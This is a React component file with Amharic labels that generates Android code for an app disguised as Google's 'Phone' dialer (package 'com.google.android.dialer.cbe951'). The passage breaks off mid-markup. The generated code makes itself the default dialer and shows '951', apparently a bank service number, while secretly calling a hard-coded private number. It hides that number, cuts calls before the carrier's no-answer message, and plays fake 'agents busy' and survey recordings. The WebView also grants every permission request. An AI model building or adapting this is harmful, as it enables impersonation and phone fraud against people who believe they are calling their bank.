import React, { useState, useRef, useEffect } from 'react';
import {
  PhoneForwarded,
  Upload,
  Mic,
  Square,
  Play,
  Pause,
  Scissors,
  Plus,
  Trash2,
  Check,
  X,
  Code2,
  Copy,
  Download,
  Sparkles,
  ShieldCheck,
  RefreshCw,
} from 'lucide-react';
import {
  SecretLiveBridgeConfig,
  SecretAudioSlot,
  saveSecretLiveBridgeConfig,
  saveSecretBridgeSlotAudio,
  deleteSecretBridgeSlotAudio,
  getSecretBridgeSlotBlob,
  getSecretBridgeSlotAudioUrl,
} from './secretLiveBridge';
import {
  decodeBlobToAudioBuffer,
  extractWaveformPeaks,
  keepAudioRange,
  cutOutAudioRange,
  appendAudioBlobs,
  audioBufferToWavBlob,
} from './audioEditorUtils';

interface SecretLiveBridgeModalProps {
  config: SecretLiveBridgeConfig;
  onConfigUpdated: (updated: SecretLiveBridgeConfig) => void;
  onClose: () => void;
  initialTab?: 'settings' | 'javanide';
}

export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
  config,
  onConfigUpdated,
  onClose,
  initialTab = 'settings',
}) => {
  const [activeTab, setActiveTab] = useState<'settings' | 'javanide'>(initialTab);
  const [targetNumber, setTargetNumber] = useState<string>(config.targetPhoneNumber || '0965848508');
  const [maxRingSec, setMaxRingSec] = useState<number>(config.maxRingSeconds || 8);
  const [vercelUrl, setVercelUrl] = useState<string>(
    config.vercelAppUrl ||
      (typeof window !== 'undefined' ? window.location.origin : 'https://your-app.vercel.app')
  );
  const [javaFileTab, setJavaFileTab] = useState<'manifest' | 'main' | 'service' | 'guide'>('manifest');
  const [copiedLabel, setCopiedLabel] = useState<string>('');
  const [statusBanner, setStatusBanner] = useState<string>('');
  const [isDownloadingZip, setIsDownloadingZip] = useState<boolean>(false);

  // Voice recording for busy_hold or post_call_survey
  const [recordingSlot, setRecordingSlot] = useState<SecretAudioSlot | null>(null);
  const [recordingSeconds, setRecordingSeconds] = useState<number>(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const recordedChunksRef = useRef<BlobPart[]>([]);
  const recordTimerRef = useRef<any>(null);

  // Preview audio player
  const [playingSlot, setPlayingSlot] = useState<SecretAudioSlot | null>(null);
  const previewAudioRef = useRef<HTMLAudioElement | null>(null);

  // Waveform Editor for either slot
  const [editingSlot, setEditingSlot] = useState<SecretAudioSlot | null>(null);
  const [editorAudioBuffer, setEditorAudioBuffer] = useState<AudioBuffer | null>(null);
  const [editorPeaks, setEditorPeaks] = useState<number[]>([]);
  const [editorDuration, setEditorDuration] = useState<number>(0);
  const [selStartSec, setSelStartSec] = useState<number>(0);
  const [selEndSec, setSelEndSec] = useState<number>(0);
  const [isEditorBusy, setIsEditorBusy] = useState<boolean>(false);
  const [isPlusRecording, setIsPlusRecording] = useState<boolean>(false);
  const [plusRecordSec, setPlusRecordSec] = useState<number>(0);
  const plusRecorderRef = useRef<MediaRecorder | null>(null);
  const plusChunksRef = useRef<BlobPart[]>([]);
  const plusTimerRef = useRef<any>(null);

  // Long press for slots
  const longPressTimerRef = useRef<any>(null);

  useEffect(() => {
    return () => {
      stopAllMedia();
    };
  }, []);

  const stopAllMedia = () => {
    if (previewAudioRef.current) {
      previewAudioRef.current.pause();
      previewAudioRef.current = null;
    }
    setPlayingSlot(null);
    if (recordTimerRef.current) clearInterval(recordTimerRef.current);
    if (plusTimerRef.current) clearInterval(plusTimerRef.current);
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      try {
        mediaRecorderRef.current.stop();
      } catch {}
    }
    if (plusRecorderRef.current && plusRecorderRef.current.state !== 'inactive') {
      try {
        plusRecorderRef.current.stop();
      } catch {}
    }
  };

  const handleSaveBasicSettings = (override?: Partial<SecretLiveBridgeConfig>) => {
    const updated = saveSecretLiveBridgeConfig({
      targetPhoneNumber: targetNumber.trim() || '0965848508',
      maxRingSeconds: Math.max(4, Math.min(25, Number(maxRingSec) || 8)),
      vercelAppUrl: vercelUrl.trim() || window.location.origin,
      ...override,
    });
    onConfigUpdated(updated);
    setStatusBanner('✅ የድብቅ ስልክ ቅንብር ተቀምጧል!');
  };

  const handleUploadSlotFile = async (slot: SecretAudioSlot, file: File) => {
    const updated = await saveSecretBridgeSlotAudio(slot, file);
    onConfigUpdated(updated);
    setStatusBanner(
      slot === 'busy_hold'
        ? `✅ የ«ሁሉም ሰራተኞች ደንበኛ በማስተናገድ ላይ ናቸው» MP3 (${file.name}) ተጭኗል!`
        : `✅ የ«አስተያየት መስጫ (ቀጣይ ያሉትን መሙያ ይንኩ)» MP3 (${file.name}) ተጭኗል!`
    );
  };

  const startSlotVoiceRecording = async (slot: SecretAudioSlot) => {
    stopAllMedia();
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      recordedChunksRef.current = [];
      const recorder = new MediaRecorder(stream);
      mediaRecorderRef.current = recorder;

      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          recordedChunksRef.current.push(e.data);
        }
      };

      recorder.onstop = async () => {
        stream.getTracks().forEach((t) => t.stop());
        if (recordTimerRef.current) {
          clearInterval(recordTimerRef.current);
          recordTimerRef.current = null;
        }
        setRecordingSlot(null);

        const rawBlob = new Blob(recordedChunksRef.current, {
          type: recorder.mimeType || 'audio/webm',
        });
        if (rawBlob.size < 100) return;

        try {
          const decoded = await decodeBlobToAudioBuffer(rawBlob);
          const wavBlob = audioBufferToWavBlob(decoded);
          const fileName =
            slot === 'busy_hold' ? 'busy_agents_recorded.wav' : 'post_call_survey_recorded.wav';
          const file = new File([wavBlob], fileName, { type: 'audio/wav' });
          const updated = await saveSecretBridgeSlotAudio(slot, file);
          onConfigUpdated(updated);
          setStatusBanner(`🎙️ የተቀዳው ድምፅ (${decoded.duration.toFixed(1)}s) በትክክል ተቀምጧል!`);
        } catch {
          const file = new File([rawBlob], `${slot}_recorded.webm`, { type: rawBlob.type });
          const updated = await saveSecretBridgeSlotAudio(slot, file);
          onConfigUpdated(updated);
          setStatusBanner('🎙️ የተቀዳው ድምፅ ተቀምጧል!');
        }
      };

      recorder.start();
      setRecordingSlot(slot);
      setRecordingSeconds(0);
      recordTimerRef.current = setInterval(() => {
        setRecordingSeconds((s) => s + 1);
      }, 1000);
    } catch {
      setStatusBanner('⚠️ የማይክሮፎን ፈቃድ (Mic Permission) ይፍቀዱ።');
    }
  };

  const stopSlotVoiceRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      mediaRecorderRef.current.stop();
    }
  };

  const togglePreviewSlot = (slot: SecretAudioSlot) => {
    if (playingSlot === slot && previewAudioRef.current) {
      previewAudioRef.current.pause();
      previewAudioRef.current = null;
      setPlayingSlot(null);
      return;
    }
    if (previewAudioRef.current) {
      previewAudioRef.current.pause();
      previewAudioRef.current = null;
    }

    const url = getSecretBridgeSlotAudioUrl(slot);
    const audio = new Audio(url);
    previewAudioRef.current = audio;
    setPlayingSlot(slot);
    audio.onended = () => {
      setPlayingSlot(null);
      previewAudioRef.current = null;
    };
    audio.onerror = () => {
      setPlayingSlot(null);
      previewAudioRef.current = null;
    };
    audio.play().catch(() => setPlayingSlot(null));
  };

  const openSlotEditor = async (slot: SecretAudioSlot) => {
    stopAllMedia();
    setEditingSlot(slot);
    setIsEditorBusy(true);
    try {
      let blob = await getSecretBridgeSlotBlob(slot);
      if (!blob) {
        // Fetch default audio so user can even edit or +Plus merge onto the default MP3
        const defaultUrl = getSecretBridgeSlotAudioUrl(slot);
        const res = await fetch(defaultUrl);
        blob = await res.blob();
      }
      const buf = await decodeBlobToAudioBuffer(blob);
      setEditorAudioBuffer(buf);
      setEditorDuration(buf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(buf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(buf, 64));
    } catch {
      setEditorAudioBuffer(null);
      setEditorPeaks([]);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const handleTrimKeepRange = async () => {
    if (!editingSlot || !editorAudioBuffer) return;
    setIsEditorBusy(true);
    try {
      const wavBlob = keepAudioRange(editorAudioBuffer, selStartSec, selEndSec);
      const file = new File([wavBlob], `${editingSlot}_trimmed.wav`, { type: 'audio/wav' });
      const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
      onConfigUpdated(updated);
      const newBuf = await decodeBlobToAudioBuffer(wavBlob);
      setEditorAudioBuffer(newBuf);
      setEditorDuration(newBuf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(newBuf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
      setStatusBanner(`✂️ ተቆርጦ (${newBuf.duration.toFixed(1)}s) ተቀምጧል!`);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const handleCutMiddleRange = async () => {
    if (!editingSlot || !editorAudioBuffer) return;
    setIsEditorBusy(true);
    try {
      const wavBlob = cutOutAudioRange(editorAudioBuffer, selStartSec, selEndSec);
      const file = new File([wavBlob], `${editingSlot}_cut.wav`, { type: 'audio/wav' });
      const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
      onConfigUpdated(updated);
      const newBuf = await decodeBlobToAudioBuffer(wavBlob);
      setEditorAudioBuffer(newBuf);
      setEditorDuration(newBuf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(newBuf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
      setStatusBanner(`✂️ የተመረጠው ቦታ ወጥቶ (${newBuf.duration.toFixed(1)}s) ተቀምጧል!`);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const handlePlusAppendMp3 = async (extraFile: File) => {
    if (!editingSlot) return;
    setIsEditorBusy(true);
    try {
      let existing = await getSecretBridgeSlotBlob(editingSlot);
      if (!existing && editorAudioBuffer) {
        existing = audioBufferToWavBlob(editorAudioBuffer);
      }
      const mergedBlob = existing ? await appendAudioBlobs(existing, extraFile) : extraFile;
      const file = new File([mergedBlob], `${editingSlot}_plus_merged.wav`, {
        type: 'audio/wav',
      });
      const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
      onConfigUpdated(updated);
      const newBuf = await decodeBlobToAudioBuffer(mergedBlob);
      setEditorAudioBuffer(newBuf);
      setEditorDuration(newBuf.duration);
      setSelStartSec(0);
      setSelEndSec(Number(newBuf.duration.toFixed(2)));
      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
      setStatusBanner(`➕ አዲሱ MP3 ተቀጥሎ (${newBuf.duration.toFixed(1)}s) አንድ አካል ሆኗል!`);
    } finally {
      setIsEditorBusy(false);
    }
  };

  const startPlusVoiceAppend = async () => {
    if (!editingSlot) return;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      plusChunksRef.current = [];
      const rec = new MediaRecorder(stream);
      plusRecorderRef.current = rec;

      rec.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) plusChunksRef.current.push(e.data);
      };

      rec.onstop = async () => {
        stream.getTracks().forEach((t) => t.stop());
        if (plusTimerRef.current) clearInterval(plusTimerRef.current);
        setIsPlusRecording(false);

        const newVoiceBlob = new Blob(plusChunksRef.current, {
          type: rec.mimeType || 'audio/webm',
        });
        if (newVoiceBlob.size < 100) return;

        setIsEditorBusy(true);
        try {
          let existing = await getSecretBridgeSlotBlob(editingSlot);
          if (!existing && editorAudioBuffer) {
            existing = audioBufferToWavBlob(editorAudioBuffer);
          }
          const mergedBlob = existing
            ? await appendAudioBlobs(existing, newVoiceBlob)
            : newVoiceBlob;
          const file = new File([mergedBlob], `${editingSlot}_plus_voice.wav`, {
            type: 'audio/wav',
          });
          const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
          onConfigUpdated(updated);
          const newBuf = await decodeBlobToAudioBuffer(mergedBlob);
          setEditorAudioBuffer(newBuf);
          setEditorDuration(newBuf.duration);
          setSelStartSec(0);
          setSelEndSec(Number(newBuf.duration.toFixed(2)));
          setEditorPeaks(extractWaveformPeaks(newBuf, 64));
          setStatusBanner(`➕ የተቀዳው ድምፅ ተቀጥሎ (${newBuf.duration.toFixed(1)}s) አንድ አካል ሆኗል!`);
        } finally {
          setIsEditorBusy(false);
        }
      };

      rec.start();
      setIsPlusRecording(true);
      setPlusRecordSec(0);
      plusTimerRef.current = setInterval(() => {
        setPlusRecordSec((s) => s + 1);
      }, 1000);
    } catch {
      setStatusBanner('⚠️ የማይክሮፎን ፈቃድ ይፍቀዱ።');
    }
  };

  const stopPlusVoiceAppend = () => {
    if (plusRecorderRef.current && plusRecorderRef.current.state !== 'inactive') {
      plusRecorderRef.current.stop();
    }
  };

  const handleDeleteSlotMp3 = async (slot: SecretAudioSlot) => {
    stopAllMedia();
    const updated = await deleteSecretBridgeSlotAudio(slot);
    onConfigUpdated(updated);
    if (editingSlot === slot) {
      setEditingSlot(null);
    }
    setStatusBanner('🗑️ የገባው MP3 ተሰርዞ ወደ ነባሪ ተመልሷል (ባዶ ሆኗል)።');
  };

  const handleDownloadGithubZip = async () => {
    setIsDownloadingZip(true);
    try {
      const res = await fetch('/api/export-github-zip');
      if (!res.ok) throw new Error('Download failed');
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'google-phone-951-github-root.zip';
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      setStatusBanner('📦 የGitHub Root ZIP ፋይል ወርዷል! Extract አድርገው GitHub/Vercel ላይ ይጫኑት።');
    } catch {
      setStatusBanner('⚠️ ZIP ማውረድ አልተቻለም። እንደገና ይሞክሩ።');
    } finally {
      setIsDownloadingZip(false);
    }
  };

  // Generate Complete Android Java N-IDE Code Files
  const cleanVercelUrl = (vercelUrl || 'https://your-app.vercel.app').trim();

  const androidManifestXml = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.google.android.dialer.cbe951">

    <!-- 1. የስልክ ጥሪ፣ ኢንተርኔት እና ድምፅ ፈቃዶች (Full Call & Audio Permissions) -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />

    <application
        android:allowBackup="true"
        android:label="Phone"
        android:usesCleartextTraffic="true"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">

        <!-- Main Hybrid WebView Dialer Activity -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:screenOrientation="portrait"
            android:configChanges="orientation|screenSize|keyboardHidden">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>

            <!-- Required Intent Filters so Android allows setting this app as Default Phone App -->
            <intent-filter>
                <action android:name="android.intent.action.DIAL" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="tel" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.DIAL" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <action android:name="android.intent.action.DIAL" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="tel" />
            </intent-filter>
        </activity>

        <!-- 2. SecretInCallService: Hides 0965848508 & controls 2-ring disconnect + Remote Hangup Survey -->
        <service
            android:name=".SecretInCallService"
            android:permission="android.permission.BIND_INCALL_SERVICE"
            android:exported="true">
            <meta-data
                android:name="android.telecom.IN_CALL_SERVICE_UI"
                android:value="true" />
            <intent-filter>
                <action android:name="android.telecom.InCallService" />
            </intent-filter>
        </service>

    </application>
</manifest>`;

  const mainActivityJava = `package com.google.android.dialer.cbe951;

import android.Manifest;
import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telecom.TelecomManager;
import android.webkit.JavascriptInterface;
import android.webkit.PermissionRequest;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    // የVercel ሊንክዎ እዚህ ተሞልቷል (ትክክለኛውን የVercel ሊንክ መቀየር ይችላሉ)
    private static final String VERCEL_WEB_APP_URL = "${cleanVercelUrl}";
    private static final int REQ_PERMISSIONS = 101;
    private static final int REQ_DEFAULT_DIALER = 102;

    public static MainActivity instance;
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instance = this;

        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);

        // Connect Java Bridge so WebView can secretly dial 0965848508 while showing 951
        webView.addJavascriptInterface(new AndroidTelecomBridge(this), "AndroidTelecomBridge");

        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        request.grant(request.getResources());
                    }
                });
            }
        });

        requestRequiredPermissions();
        requestDefaultDialerRole();

        webView.loadUrl(VERCEL_WEB_APP_URL);
    }

    private void requestRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] perms = new String[]{
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.MODIFY_AUDIO_SETTINGS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG
            };
            requestPermissions(perms, REQ_PERMISSIONS);
        }
    }

    public void requestDefaultDialerRole() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                RoleManager roleManager = (RoleManager) getSystemService(Context.ROLE_SERVICE);
                if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_DIALER)) {
                    if (!roleManager.isRoleHeld(RoleManager.ROLE_DIALER)) {
                        Intent intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_DIALER);
                        startActivityForResult(intent, REQ_DEFAULT_DIALER);
                    }
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
                if (tm != null && !getPackageName().equals(tm.getDefaultDialerPackage())) {
                    Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
                    intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, getPackageName());
                    startActivityForResult(intent, REQ_DEFAULT_DIALER);
                }
            }
        } catch (Exception ignored) {}
    }

    // Notify WebView JavaScript events safely on UI thread
    public void notifyWebViewJs(final String jsCode) {
        if (webView == null) return;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    webView.evaluateJavascript(jsCode, null);
                } else {
                    webView.loadUrl("javascript:" + jsCode);
                }
            }
        });
    }

    public class AndroidTelecomBridge {
        private final Context ctx;

        public AndroidTelecomBridge(Context ctx) {
            this.ctx = ctx;
        }

        @JavascriptInterface
        public void placeSecretCall(String phoneNumber, int maxRingMs) {
            try {
                SecretInCallService.setMaxRingTimeoutMs(maxRingMs > 0 ? maxRingMs : 8000);
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                Uri uri = Uri.fromParts("tel", phoneNumber, null);
                Bundle extras = new Bundle();
                if (tm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                        tm.placeCall(uri, extras);
                        return;
                    }
                }
                Intent callIntent = new Intent(Intent.ACTION_CALL, uri);
                callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(callIntent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @JavascriptInterface
        public void cancelCurrentAttempt() {
            SecretInCallService.disconnectActiveCallAttempt(true);
        }

        @JavascriptInterface
        public void endAllCalls() {
            SecretInCallService.disconnectActiveCallAttempt(false);
        }

        @JavascriptInterface
        public void setSpeakerphone(boolean on) {
            try {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    am.setSpeakerphoneOn(on);
                }
            } catch (Exception ignored) {}
        }

        @JavascriptInterface
        public void setMicrophoneMute(boolean muted) {
            try {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    am.setMicrophoneMute(muted);
                }
            } catch (Exception ignored) {}
        }

        @JavascriptInterface
        public boolean isDefaultDialer() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                return tm != null && ctx.getPackageName().equals(tm.getDefaultDialerPackage());
            }
            return false;
        }

        @JavascriptInterface
        public void requestDefaultDialerRole() {
            MainActivity.this.requestDefaultDialerRole();
        }
    }
}`;

  const secretInCallServiceJava = `package com.google.android.dialer.cbe951;

import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telecom.Call;
import android.telecom.InCallService;

/**
 * SecretInCallService:
 * 1. Hides the real target phone number (e.g. 0965848508) so only the WebView "951" screen is visible.
 * 2. Counts 2 rings (maxRingTimeoutMs = 8000ms). If the person does NOT answer within 2 rings,
 *    disconnects BEFORE Ethio Telecom plays "የደወሉለት ደንበኛ..." and calls window.onSecretCallNoAnswer()
 *    so the WebView plays your "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3 and silently redials!
 * 3. When the person answers (STATE_ACTIVE), notifies window.onSecretCallAnswered().
 * 4. When they finish talking and the remote person hangs up (STATE_DISCONNECTED after STATE_ACTIVE),
 *    keeps the 951 screen open and calls window.onSecretCallRemoteEnded() to play the Survey MP3!
 */
public class SecretInCallService extends InCallService {

    private static Call currentCall = null;
    private static int maxRingTimeoutMs = 8000; // Default 2 rings (~8 seconds)
    private static boolean wasAnsweredLive = false;
    private static boolean cancelledByTimeout = false;
    private static int attemptCount = 0;
    private static final Handler ringHandler = new Handler(Looper.getMainLooper());

    private static final Runnable twoRingTimeoutRunnable = new Runnable() {
        @Override
        public void run() {
            if (currentCall != null) {
                int state = currentCall.getState();
                if (state != Call.STATE_ACTIVE) {
                    cancelledByTimeout = true;
                    try {
                        currentCall.disconnect();
                    } catch (Exception ignored) {}
                    if (MainActivity.instance != null) {
                        MainActivity.instance.notifyWebViewJs(
                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                        );
                    }
                }
            }
        }
    };

    public static void setMaxRingTimeoutMs(int ms) {
        maxRingTimeoutMs = ms;
    }

    public static void disconnectActiveCallAttempt(boolean isTimeoutCancel) {
        cancelledByTimeout = isTimeoutCancel;
        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
        if (currentCall != null) {
            try {
                currentCall.disconnect();
            } catch (Exception ignored) {}
        }
    }

    private final Call.Callback callCallback = new Call.Callback() {
        @Override
        public void onStateChanged(Call call, int state) {
            super.onStateChanged(call, state);
            handleCallState(call, state);
        }
    };

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        currentCall = call;
        wasAnsweredLive = false;
        cancelledByTimeout = false;
        attemptCount++;

        call.registerCallback(callCallback);

        // Keep our MainActivity (showing ONLY 951) in the foreground
        if (MainActivity.instance != null) {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(i);
        }

        // Start 2-ring countdown so we cut BEFORE carrier voicemail / "የደወሉለት ደንበኛ..."
        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
        ringHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);

        handleCallState(call, call.getState());
    }

    @Override
    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
        ringHandler.removeCallbacks(twoRingTimeoutRunnable);
        call.unregisterCallback(callCallback);
        if (currentCall == call) {
            currentCall = null;
        }
    }

    private void handleCallState(Call call, int state) {
        if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
            if (MainActivity.instance != null) {
                MainActivity.instance.notifyWebViewJs(
                    "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                );
            }
        } else if (state == Call.STATE_ACTIVE) {
            // The support person at 0965848508 answered! Stop the 2-ring timer.
            wasAnsweredLive = true;
            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            if (MainActivity.instance != null) {
                MainActivity.instance.notifyWebViewJs(
                    "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                );
            }
        } else if (state == Call.STATE_DISCONNECTED) {
            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
            if (wasAnsweredLive) {
                // Person answered, talked with caller, and now hung up!
                // Trigger Post-Call Survey MP3 ("ቀጣይ ያሉትን መሙያ ይንኩ") on 951 screen!
                wasAnsweredLive = false;
                if (MainActivity.instance != null) {
                    MainActivity.instance.notifyWebViewJs(
                        "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
                    );
                }
            } else if (!cancelledByTimeout) {
                // Busy or rejected before 2 rings finished -> immediately play Busy MP3 & redial
                if (MainActivity.instance != null) {
                    MainActivity.instance.notifyWebViewJs(
                        "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                    );
                }
            }
        }
    }
}`;

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedLabel(label);
    setTimeout(() => setCopiedLabel(''), 2500);
  };

  const downloadTextFile = (filename: string, content: string) => {
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/65 p-2 sm:p-4 select-none"
      onClick={onClose}
    >
      <div
        className="w-full max-w-[410px] max-h-[92vh] bg-white rounded-3xl shadow-2xl flex flex-col overflow-hidden border border-slate-200"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top Header */}
        <div className="bg-gradient-to-r from-slate-900 via-emerald-950 to-slate-900 text-white px-4 py-3 flex items-center justify-between shrink-0">
          <div className="flex items-center gap-2">
            <PhoneForwarded className="w-4 h-4 text-emerald-400" />
            <div>
              <h3 className="text-xs font-extrabold">
                📞 ድብቅ የቀጥታ ስልክ (4 ሲነካ) + Java N-IDE Hybrid
              </h3>
              <p className="text-[10px] text-emerald-300">
                ስክሪኑ 951 ብቻ እያሳየ ወደ {targetNumber || '0965848508'} በድብቅ መደወያ
              </p>
            </div>
          </div>
          <button
            type="button"
            onClick={() => {
              stopAllMedia();
              onClose();
            }}
            className="w-7 h-7 rounded-full bg-white/15 hover:bg-white/25 flex items-center justify-center text-xs font-bold"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Sub-Tabs: 1. Secret Live Call & MP3 Settings | 2. Java N-IDE Code + GitHub ZIP */}
        <div className="grid grid-cols-2 bg-slate-100 p-1 gap-1 border-b border-slate-200 shrink-0">
          <button
            type="button"
            onClick={() => setActiveTab('settings')}
            className={`py-2 rounded-xl text-[11px] font-extrabold flex items-center justify-center gap-1.5 transition-all ${
              activeTab === 'settings'
                ? 'bg-emerald-600 text-white shadow-xs'
                : 'text-slate-700 hover:bg-white/60'
            }`}
          >
            <PhoneForwarded className="w-3.5 h-3.5" />
            <span>1. ድብቅ ስልክና MP3 ቅንብር</span>
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('javanide')}
            className={`py-2 rounded-xl text-[11px] font-extrabold flex items-center justify-center gap-1.5 transition-all ${
              activeTab === 'javanide'
                ? 'bg-blue-600 text-white shadow-xs'
                : 'text-slate-700 hover:bg-white/60'
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            <span>2. Java N-IDE ኮድ & ZIP</span>
          </button>
        </div>

        {statusBanner && (
          <div className="mx-3 mt-2 px-3 py-1.5 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-900 text-[11px] font-bold flex items-center justify-between">
            <span>{statusBanner}</span>
            <button
              type="button"
              onClick={() => setStatusBanner('')}
              className="text-emerald-700 font-bold ml-2"
            >
              ✕
            </button>
          </div>
        )}

        {/* Body */}
        <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
          {activeTab === 'settings' ? (
            <>
              {/* Master Enable Toggle */}
              <div
                className={`p-3 rounded-2xl border transition-all ${
                  config.enabled
                    ? 'bg-emerald-50 border-emerald-400 ring-2 ring-emerald-100'
                    : 'bg-slate-50 border-slate-200'
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <div>
